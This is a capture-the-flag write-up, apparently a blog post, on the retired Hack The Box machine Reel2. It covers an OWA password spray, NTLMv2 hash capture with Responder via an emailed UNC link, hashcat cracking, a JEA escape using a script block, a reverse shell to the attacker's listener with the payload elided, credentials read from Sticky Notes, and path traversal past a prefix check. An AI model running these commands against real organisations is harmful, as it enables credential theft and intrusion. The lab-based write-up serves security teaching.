---
layout: post
title: "The Cage That Read Its Own Name Backwards"
subtitle: "HTB Reel2, where a season becomes a password, a mailed link becomes a hash, and a fence checks the front of your name but never the back"
date: 2021-03-20 12:00:00 +0000
description: "Reel2 is four small trusts in a row: a season guessed into a password, an email that mails you a hash, a cage you walk out of with one symbol, and a fence that only checks the front of the path."
image: /assets/og/the-cage-that-read-its-own-name-backwards.png
tags: [hackthebox, writeup]
---

Reel2 never gets exotic, and that is the unsettling part. Nobody overflows a buffer or smuggles shellcode past a guard. Every door opens because somebody trusted the wrong small thing. A staffer posts about loving summer, and the season becomes a password. You send the whole office a friendly link, and one of them mails you their hash without meaning to. You land inside a cage built to let you run eight harmless commands, and one punctuation mark walks you out of it. Then, at the very end, a custom helper meant to read only two safe folders gets handed a path that starts safe and ends anywhere. Four cages, four people who built them, four people who only checked the front of the lock.

```
        R E E L 2
        =========
        a season  →  "Summer2020"   the office wears the same coat
              |
        a friendly email → click → )))  responder catches a hash
              |
        a cage of 8 commands → &{ ... } → you step out sideways
              |
        check-file:  "must start C:\ProgramData\..."
                     C:\ProgramData\..\Users\Administrator   ← still passes
                                                            籠
```

## 0x01 · the ports and the social club

`nmap` paints a Windows shop that does two jobs at once. IIS and HTTPS on 80 and 443, WinRM up on 5985, and the long picket fence of Exchange RPC ports in the 6000s. That cluster is the tell: this box runs Outlook Web Access, a whole mail server with a login page facing the internet.

```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 8.5
443/tcp   open  ssl/http      Microsoft IIS httpd 8.5
5985/tcp  open  http          WinRM
6001-6012 open  msrpc         Exchange RPC
8080/tcp  open  http          Apache (Wallstant social network)
```

The IIS 8.5 banner dates the host to Windows Server 2012 R2. But the door that matters first is 8080, running Wallstant, a small open-source social network. Register an account, browse the member directory, and you are reading the staff roster of the company you are about to attack. A scroll through the search page, scraped with a few lines of JavaScript in the browser console, hands you a clean list of full names.

```javascript
var res = [];
document.querySelectorAll('.user_name').forEach(u => res.push(u.textContent));
console.log(res.join('\n'));
```

Picture a corporate softball league that posts every player's full name on a public bulletin board. Harmless on its own. But a name is half of a login, and now you have the whole team's worth.

## 0x02 · the season that was a password

Names are not passwords, but people are people. Read the Wallstant posts and one user, Sven, is chatting about how he likes to rotate his passwords with the seasons. That is not a hint hidden in a config file. That is a man telling you his scheme out loud at the office party. Season plus year is the oldest weak-password recipe on Earth, and in this month of the calendar it spells `Summer2020`.

Now turn names into usernames and throw that one guess at the mail server. `spindrift.py` from byt3bl33d3r's SprayingToolkit chews the harvested full names into every common login format (`s.svensson`, `sven.svensson`, and so on), and `atomizer.py` sprays the single password against the OWA autodiscover endpoint.

```
$ atomizer.py owa 10.10.10.210 'Summer2020' usernames.txt
[*] Spraying against OWA at https://10.10.10.210/autodiscover/autodiscover.xml
[+] FOUND  HTB\s.svensson : Summer2020
```

A spray is the opposite of a brute force, and the difference is the whole point. Brute force is trying ten thousand keys in one lock until the cylinder wears out and the alarm trips. Spraying is trying one key, the master-key shape everybody secretly cuts, in every lock on the street. Lock-out counters never fire because no single account sees more than one attempt. One door on the block was always going to be `Summer2020`, and it belonged to s.svensson.

## 0x03 · the link that mailed back a hash

Those credentials log straight into the OWA web client, so you are now sitting in a real employee's inbox. Useful, but not a shell. The move here is to make the building's other tenants knock on your door.

Open the global address list, which is just the company phone book, and compose a mail to everyone in it. The body holds a link pointing at a file share on your own machine, `\\10.10.14.4\anything`. Meanwhile your `responder` sits on that address waiting.

```
$ responder -I tun0
[*] Listening for events...
```

When a Windows machine reaches for a `\\` path, it does not knock politely and wait to be asked for a password. It walks up and offers its NTLM credentials automatically, assuming the share is a trusted coworker. Responder is a coworker-shaped catcher's mitt. One curious recipient, k.svensson, follows the link, and their machine hands over an NTLMv2 hash before anyone thinks to ask who you are.

```
[SMB] NTLMv2-SSP Hash : k.svensson::HTB:a744637a...:2914FC6B...
```

Think of it like a doorman trained to greet anyone wearing the company jacket. You hang a jacket on a coatrack across the street, and the doorman jogs over to introduce himself, ID already out. An NTLMv2 hash is not the password, but it is a sealed envelope with the password inside, and `hashcat` in mode 5600 steams it open in seconds.

```
$ hashcat -m 5600 k.hash rockyou.txt
K.SVENSSON::HTB:...:kittycat1
```

`kittycat1`. The envelope is open.

## 0x04 · eight commands and a way out

k.svensson is allowed to use WinRM, so you connect a remote PowerShell session. The welcome is a slammed door. This is JEA, Just Enough Administration, a cage that lets an account run a tiny hand-picked menu of commands and absolutely nothing else.

```
$ pwsh
PS> $cred = Get-Credential   # HTB\k.svensson : kittycat1
PS> Enter-PSSession -Computer 10.10.10.210 -Credential $cred -Authentication Negotiate
[10.10.10.210]: PS> whoami
The term 'whoami' is not recognized...
[10.10.10.210]: PS> Get-Command
Clear-Host  Exit-PSSession  Get-Command  Get-FormatData
Get-Help    Measure-Object  Out-Default  Select-Object
```

Eight commands, and the session runs in ConstrainedLanguage mode on top of that, which strips out most of what makes PowerShell powerful. Picture a library where you may read exactly eight books and you are not allowed to bring a pen. That is the design.

The design has a seam. ConstrainedLanguage blocks a lot, but it still lets you define and invoke a script block with the call operator, the little `&`. And a script block is just a sealed bag where you put your own commands. The cage checks the names on the menu; it never thinks to check what you smuggle inside an `&{ ... }`.

```
[10.10.10.210]: PS> &{ whoami }
htb\k.svensson
```

That is the whole jailbreak. One ampersand, and the menu becomes a suggestion. From inside that script block you invoke a full PowerShell reverse connection back to your listener, signed `iceberg` so you know your own work, and the new session comes back in FullLanguage mode with no cage at all.

```
[10.10.10.210]: PS> &{ [ powershell reverse shell back to 10.10.14.4 on 443, base64-blob ] }
```

```
$ nc -lvnp 443
PS> $ExecutionContext.SessionState.LanguageMode
FullLanguage
```

## 0x05 · the password on a sticky note

Now you are k.svensson with a real shell, but k.svensson is not the prize. Look at what this account was clearly built to test. Their Documents folder holds two JEA blueprint files, `jea_test_account.pssc` and `jea_test_account.psrc`, which describe a second, different cage for a second account. So there is a `jea_test_account`, and you want its password.

People keep secrets in the dumbest safe place, the thing they look at all day. This user runs Sticky Notes, and Sticky Notes stores its contents in a little LevelDB database on disk.

```
PS> type C:\Users\k.svensson\AppData\Roaming\stickynotes\Local Storage\leveldb\000003.log
...jea_test_account ... Ab!Q@vcg^%@#1...
```

There it is, scrawled on the digital equivalent of a Post-it slapped on the monitor: `jea_test_account : Ab!Q@vcg^%@#1`. Think of it like writing the vault combination on a notepad next to the vault because remembering it is annoying. The database is binary, but the password sits in it as plain text waiting to be read.

## 0x06 · the fence that only watched the front

Connect a fresh remote session, this time selecting the configuration named after the new account. The cage tightens, not loosens. This session is NoLanguage mode, which is even stricter than before. But every JEA role exists to let an account do one specific job, and this one ships with a custom helper function called `check-file`. Read its definition out of the role files you already found.

```powershell
function check-file {
    param($Path, $ComputerName=$env:COMPUTERNAME)
    [bool]$Check = $Path -like "D:\*" -or $Path -like "C:\ProgramData\*"
    if ($check) { get-content $Path }
}
```

The intent is gentle. This account may read files, but only ones living under `D:\` or under `C:\ProgramData\`. The `-like` check enforces it. And the check is real, but it only inspects how the path begins. It reads the front of the name and never the back.

A filesystem path is allowed to walk backward. `..` means "go up one level," so a path that starts inside `C:\ProgramData\` can immediately climb out of it and stroll anywhere on the drive, all while still technically beginning with the blessed prefix.

```
[10.10.10.210]: PS> check-file C:\ProgramData\..\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

The string starts with `C:\ProgramData\`, so the guard waves it through. Then the `..` turns the parade around and marches it into the Administrator's desktop. Picture a bouncer who checks that the address on your envelope starts with the right street name, then mails it without reading that the next line says "actually, redirect to the vault." The fence had a front and no back, and the back was where the flag lived.

```
[10.10.10.210]: PS> check-file C:\ProgramData\..\Users\k.svensson\Desktop\user.txt
████████████████████████████████
```

## 0x07 · the honest caveat

Nothing on Reel2 is a CVE you can patch on a Tuesday, and that is exactly why it stings. Every link in the chain is a reasonable feature with one missing check.

The password spray works because seasonal passwords feel clever to the person choosing them and look like a pattern to everyone else. The Responder catch works because Windows was built to be helpful to coworkers and cannot tell a coworker from a coatrack across the street. The JEA breakout works because a list of allowed command names is not the same as a list of allowed behaviors, and a script block is a behavior the list never thought to read. And the final `check-file` abuse is the cleanest lesson of the four, because the code does validate the path. It just validates the wrong property of it. Checking that a string starts with a safe prefix is not the same as checking where the path actually points after the operating system resolves the `..` hops. The first is reading a label. The second is following it to the end.

That is the thread running through the whole box. A guess, a hash, a cage, a fence, and in every case the defense looked at the front of something and trusted the rest. Allow-lists, prefix checks, friendly protocols, they all share the same blind spot. They confirm how a thing begins and assume the middle and the end agree. Reel2 just keeps showing you, four times in a row, that the dangerous part of any input is almost always the part you stopped reading.

## 0x08 · outro

```
a season became a key because someone said it out loud.
a link came back wearing a hash, because the door was too polite.
a cage of eight commands had a seam shaped like one symbol.
a fence checked the front of the path and never turned around.

four locks. not one of them was forced.
each one only ever guarded the side you were meant to look at.

read the whole path. mind the coatrack. wear black.

                                                            EOF
```

---

*HTB: Reel2, retired 13 Mar 2021. A hard Windows box that is really a lecture on checking the front of a thing and trusting the back, from a seasonal password all the way to a path that climbs out of its own fence.*